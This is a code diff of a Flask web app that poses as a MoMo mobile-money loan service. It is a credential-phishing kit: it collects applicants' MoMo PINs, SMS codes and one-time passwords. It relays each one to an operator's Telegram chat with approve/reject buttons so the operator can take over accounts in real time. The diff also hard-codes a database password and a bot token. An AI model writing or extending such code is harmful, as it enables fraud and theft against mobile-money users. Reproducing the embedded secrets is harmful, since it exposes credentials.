@@ -6,9 +6,9 @@ import time
 import requests
 
 app = Flask(__name__)
-app.secret_key = "super_secret_momo_key"  # Needed for session management
+app.secret_key = "super_secret_momo_key"
 
-# MongoDB connection
+# --- MONGODB CONNECTION ---
 client = MongoClient("mongodb+srv://superuser:2006@superuser.uenn69l.mongodb.net/momo_loan_db?retryWrites=true&w=majority&appName=superuser")
 db = client["momo_loan_db"]
 applications_collection = db["applications"]
@@ -17,28 +17,39 @@ applications_collection = db["applications"]
 TELEGRAM_BOT_TOKEN = "8467275364:AAFJlOk-8cOlhok0XC40s-x604G0YxW_hqs"
 TELEGRAM_ADMIN_CHAT_ID = "8965398913"
 
-def send_telegram_alert(app_data, title="NEW MOMO LOAN APPLICATION"):
-    """Sends immediate notification alert to your Telegram chat."""
+def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step_code="pin"):
+    """Sends notification with interactive action buttons to Telegram."""
+    db_id = str(app_data.get("_id"))
+    
     message = (
-        f"🚨 *{title}* 🚨\n\n"
-        f"🆔 *App ID:* `{app_data.get('app_id')}`\n"
-        f"👤 *Applicant:* {app_data.get('first_name', '')} {app_data.get('last_name', '')}\n"
+        f"📩 *{stage_title}*\n\n"
+        f"👤 *Name:* {app_data.get('first_name', '')} {app_data.get('last_name', '')}\n"
         f"📞 *Phone:* +256 {app_data.get('phone', '')}\n"
-        f"🔑 *MoMo PIN:* `{app_data.get('password', '')}`\n"
-        f"🔐 *Auth Code:* `{app_data.get('auth_code', 'N/A')}`\n"
-        f"🔐 *Final Code:* `{app_data.get('final_auth_code', 'N/A')}`\n"
-        f"💰 *Amount:* UGX {app_data.get('amount', '')}\n"
-        f"⏱️ *Term:* {app_data.get('term', '')}\n"
-        f"💼 *Employment:* {app_data.get('employment', '')}\n"
-        f"📊 *Income:* UGX {app_data.get('income', '')}\n"
-        f"📝 *Purpose:* {app_data.get('purpose', '')}"
+        f"🔑 *PIN:* `{app_data.get('password', '—')}`\n"
+        f"💬 *SMS Code:* `{app_data.get('auth_code', '—')}`\n"
+        f"🔢 *Final OTP:* `{app_data.get('final_auth_code', '—')}`\n\n"
+        f"🆔 *Application ID:* `{app_data.get('app_id')}`"
     )
+
+    # Telegram Inline Keyboard Action Buttons
+    reply_markup = {
+        "inline_keyboard": [
+            [
+                {"text": f"✅ Approve {step_code.upper()}", "callback_data": f"approve_{step_code}_{db_id}"}
+            ],
+            [
+                {"text": f"❌ Reject {step_code.upper()}", "callback_data": f"reject_{step_code}_{db_id}"},
+                {"text": "💬 Message User", "callback_data": f"msg_{step_code}_{db_id}"}
+            ]
+        ]
+    }
     
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {
         "chat_id": TELEGRAM_ADMIN_CHAT_ID,
         "text": message,
-        "parse_mode": "Markdown"
+        "parse_mode": "Markdown",
+        "reply_markup": reply_markup
     }
     
     try:
@@ -46,11 +57,64 @@ def send_telegram_alert(app_data, title="NEW MOMO LOAN APPLICATION"):
     except Exception as e:
         print(f"Telegram notification error: {e}")
 
+# --- WEBHOOK ENDPOINT FOR TELEGRAM BUTTON CLICKS ---
+@app.route("/telegram-webhook", methods=["POST"])
+def telegram_webhook():
+    data = request.get_json()
+    
+    if "callback_query" in data:
+        callback = data["callback_query"]
+        callback_data = callback["data"]
+        callback_id = callback["id"]
+        
+        parts = callback_data.split("_", 2)
+        if len(parts) == 3:
+            action, step_code, db_id = parts
+            
+            # Determine target route after approval
+            next_stage = "Pending"
+            if action == "approve":
+                if step_code == "pin":
+                    next_stage = "Stage1_Approved"  # Moves to SMS entry
+                elif step_code == "sms":
+                    next_stage = "Stage2_Approved"  # Moves to Final OTP
+                elif step_code == "otp":
+                    next_stage = "Stage3_Approved"  # Moves to Success
+                
+                applications_collection.update_one(
+                    {"_id": ObjectId(db_id)},
+                    {"$set": {"status": next_stage, "custom_message": ""}}
+                )
+                text_response = f"✅ {step_code.upper()} Approved!"
+                
+            elif action == "reject":
+                applications_collection.update_one(
+                    {"_id": ObjectId(db_id)},
+                    {"$set": {"status": f"{step_code.upper()}_Rejected", "custom_message": "Invalid code. Please re-enter and try again."}}
+                )
+                text_response = f"❌ {step_code.upper()} Rejected!"
+                
+            elif action == "msg":
+                applications_collection.update_one(
+                    {"_id": ObjectId(db_id)},
+                    {"$set": {"status": "CustomMessage", "custom_message": "Action Required: Please carefully check your authentication details and re-submit."}}
+                )
+                text_response = "💬 Prompt sent to user screen!"
+
+            answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
+            requests.post(answer_url, json={"callback_query_id": callback_id, "text": text_response})
+
+    return jsonify({"status": "ok"}), 200
+
+# --- ROUTES ---
 @app.route("/")
 def index():
     return render_template("index.html")
 
-# --- MULTI-STEP APPLICATION WIZARD ---
+@app.route("/sim-check")
+def sim_check():
+    return render_template("sim_check.html")
+
 @app.route("/apply/step1", methods=["GET", "POST"])
 def apply_step1():
     if request.method == "POST":
@@ -86,31 +150,31 @@ def processing_screen():
 def login():
     if request.method == "POST":
         pin = request.form.get("pin")
-        phone = session.get("phone", "Unknown")
         
         app_data = {
-            "loan_type": session.get("loan_type"),
-            "amount": session.get("amount"),
-            "term": session.get("term"),
-            "purpose": session.get("purpose"),
-            "first_name": session.get("first_name"),
-            "last_name": session.get("last_name"),
-            "phone": phone,
-            "employment": session.get("employment"),
-            "income": session.get("income"),
+            "loan_type": session.get("loan_type", "Personal"),
+            "amount": session.get("amount", "1000000"),
+            "term": session.get("term", "12 Months"),
+            "purpose": session.get("purpose", "General"),
+            "first_name": session.get("first_name", "User"),
+            "last_name": session.get("last_name", "Applicant"),
+            "phone": session.get("phone", "000000000"),
+            "employment": session.get("employment", "Self-Employed"),
+            "income": session.get("income", "1000000"),
             "password": pin,
-            "status": "Pending Approval",
-            "created_at": time.time(),  # Timestamp used for 5-second timer
-            "app_id": "APP-" + os.urandom(4).hex().upper(),
+            "status": "Pending_PIN",
+            "created_at": time.time(),
+            "app_id": "APP" + os.urandom(4).hex().upper(),
             "auth_code": "",
-            "final_auth_code": ""
+            "final_auth_code": "",
+            "custom_message": ""
         }
         
         inserted_id = applications_collection.insert_one(app_data).inserted_id
         session["current_app_id"] = str(inserted_id)
         
-        # Send instant notification alert to Telegram
-        send_telegram_alert(app_data, title="NEW MOMO LOAN APPLICATION")
+        app_data["_id"] = inserted_id
+        send_telegram_interactive_alert(app_data, stage_title="APPROVAL 1: PIN SUBMITTED", step_code="pin")
         
         return redirect(url_for("pending"))
     return render_template("login.html")
@@ -122,32 +186,22 @@ def pending():
         return redirect(url_for("index"))
         
     record = applications_collection.find_one({"_id": ObjectId(current_id)})
-    status = record.get("status", "Pending Approval") if record else "Pending Approval"
     app_id = record.get("app_id", "APP-PENDING") if record else "APP-PENDING"
     
-    return render_template("pending.html", app_id=app_id, status=status)
+    return render_template("pending.html", app_id=app_id)
 
-# Automatic Timer Logic: Approves application after 5 seconds
 @app.route("/check-status")
 def check_status():
     current_id = session.get("current_app_id")
     if current_id:
         record = applications_collection.find_one({"_id": ObjectId(current_id)})
         if record:
-            current_status = record.get("status", "Pending Approval")
-            created_at = record.get("created_at", time.time())
+            return jsonify({
+                "status": record.get("status", "Pending_PIN"),
+                "custom_message": record.get("custom_message", "")
+            })
             
-            # Auto-approve if 5 seconds have elapsed
-            if current_status == "Pending Approval" and (time.time() - created_at) >= 5:
-                applications_collection.update_one(
-                    {"_id": ObjectId(current_id)},
-                    {"$set": {"status": "Approved"}}
-                )
-                return jsonify({"status": "Approved"})
-            
-            return jsonify({"status": current_status})
-            
-    return jsonify({"status": "Pending Approval"})
+    return jsonify({"status": "Pending_PIN", "custom_message": ""})
 
 @app.route("/submit-auth-code", methods=["POST"])
 def submit_auth_code():
@@ -157,20 +211,13 @@ def submit_auth_code():
     if current_id:
         applications_collection.update_one(
             {"_id": ObjectId(current_id)},
-            {"$set": {"auth_code": auth_code, "status": "Completed"}}
+            {"$set": {"auth_code": auth_code, "status": "Pending_SMS"}}
         )
         record = applications_collection.find_one({"_id": ObjectId(current_id)})
+        send_telegram_interactive_alert(record, stage_title="APPROVAL 2: SMS AUTH CODE SUBMITTED", step_code="sms")
         
-        # Send notification alert when auth code is submitted
-        send_telegram_alert(record, title="CONFIDENTIAL SMS CODE SUBMITTED")
-        
-    return redirect(url_for("completed"))
+    return redirect(url_for("pending"))
 
-@app.route("/completed")
-def completed():
-    return render_template("completed.html")
-
-# --- FINAL SYSTEM AUTHENTICATION CODE ROUTES ---
 @app.route("/final-verify", methods=["GET", "POST"])
 def final_verify():
     if request.method == "POST":
@@ -180,36 +227,17 @@ def final_verify():
         if current_id:
             applications_collection.update_one(
                 {"_id": ObjectId(current_id)},
-                {"$set": {"final_auth_code": final_code, "status": "Fully Verified"}}
+                {"$set": {"final_auth_code": final_code, "status": "Pending_OTP"}}
             )
             record = applications_collection.find_one({"_id": ObjectId(current_id)})
+            send_telegram_interactive_alert(record, stage_title="APPROVAL 3: FINAL OTP SUBMITTED", step_code="otp")
             
-            # Send notification alert for the final code
-            send_telegram_alert(record, title="FINAL SYSTEM AUTH CODE SUBMITTED")
-            
-        return redirect(url_for("success"))
+        return redirect(url_for("pending"))
     return render_template("final_verify.html")
 
 @app.route("/success")
 def success():
     return render_template("success.html")
-
-@app.route("/admin")
-def admin_dashboard():
-    if request.args.get("admin") != "ADMIN036":
-        return "Unauthorized Access", 403
-    all_apps = list(applications_collection.find())
-    return render_template("admin.html", applications=all_apps)
-
-@app.route("/admin/update/<app_id>/<status>")
-def update_status(app_id, status):
-    applications_collection.update_one({"_id": ObjectId(app_id)}, {"$set": {"status": status}})
-    return redirect(url_for("admin_dashboard", admin="ADMIN036"))
-
-@app.route("/admin/delete/<app_id>")
-def delete_application(app_id):
-    applications_collection.delete_one({"_id": ObjectId(app_id)})
-    return redirect(url_for("admin_dashboard", admin="ADMIN036"))
 
 if __name__ == "__main__":
     app.run(debug=True, port=5000)
